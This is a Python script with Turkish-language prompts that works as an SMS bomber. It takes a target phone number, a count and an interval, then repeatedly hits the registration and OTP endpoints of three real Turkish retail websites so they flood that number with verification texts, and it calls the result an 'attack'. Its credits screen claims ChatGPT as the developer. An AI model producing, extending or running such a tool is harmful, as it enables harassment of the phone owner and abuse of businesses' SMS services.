import time
import requests
import random
import colorama
import os
colorama.init()

# SMS API fonksiyonları _____________________________________________________________________
def sms_gonder_kahvedunyasi(numara):
    url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
    payload = {"phone": numara}
    try:
        response = requests.post(url, json=payload)
        return response.status_code == 200, "Kahve Dünyası"
    except Exception as e:
        return False, f"Kahve Dünyası Hatası: {e}"

def sms_gonder_wmf(numara):
    url = "https://www.wmf.com.tr/users/register/"
    payload = {"phone": numara}
    try:
        response = requests.post(url, json=payload)
        return response.status_code == 200, "WMF"
    except Exception as e:
        return False, f"WMF Hatası: {e}"

def sms_gonder_english_home(numara):
    url = "https://www.englishhome.com:443/api/member/sendOtp"
    payload = {"phone": numara}
    try:
        response = requests.post(url, json=payload)
        return response.status_code == 200, "English Home"
    except Exception as e:
        return False, f"English Home Hatası: {e}"

logo = '''

'''
# Ana Menü Fonksiyonu
def ana_menu():
    print("Ana Menü:")
    print("1. SMS'e Başla")
    print("2. Emeği Geçenler")
    print("3. Çıkış")
    
    secim = input("Seçiminizi yapın (1/2/3): ")
    
    if secim == "1":
        sms_baslat()
    elif secim == "2":
        emegi_gecenler()
    elif secim == "3":
        print("Çıkılıyor...")
        exit()
    else:
        print("Geçersiz seçim! Tekrar deneyin.")
        ana_menu()

# SMS Gönderme Başlatma
def sms_baslat():
    numara = input("Telefon numaranızı girin (başında sıfır olmadan): ")
    sms_sayisi = int(input("Kaç SMS göndermek istiyorsunuz? "))
    aralik = int(input("Kaç saniye aralıklarla göndermek istersiniz? "))
    
    # API fonksiyonları listesi
    api_fonksiyonlari = [sms_gonder_kahvedunyasi, sms_gonder_wmf, sms_gonder_english_home]
    # [Diğer API fonksiyonları burada olacak]
    
    # SMS gönderimi
    for i in range(sms_sayisi):
        api_fonksiyonu = random.choice(api_fonksiyonlari)
        basari, site_adi = api_fonksiyonu(numara)
        
        if basari:
            print(f"✅ SMS başarıyla gönderildi! ({site_adi})")
        else:
            print(f"❌ SMS gönderilemedi: {site_adi}")
        
        if i < sms_sayisi - 1:
            print(f"{aralik} saniye bekleniyor...")
            time.sleep(aralik)
    
    # Saldırı bittiğinde Enter ile ana menüye dön
    input("\nSaldırı tamamlandı! Ana menüye dönmek için Enter'a basın...")
    ana_menu()

# Emeği Geçenler
def emegi_gecenler():
    print("SMS Botunu geliştirenler:")
    print("- Geliştirici: ChatGPT")
    print("- API Sağlayıcılar: Kahve Dünyası, WMF, English Home, ...")
    print("İleriye dönük güncellemeler yapılacaktır.")
    ana_menu()

# Başlangıç
ana_menu()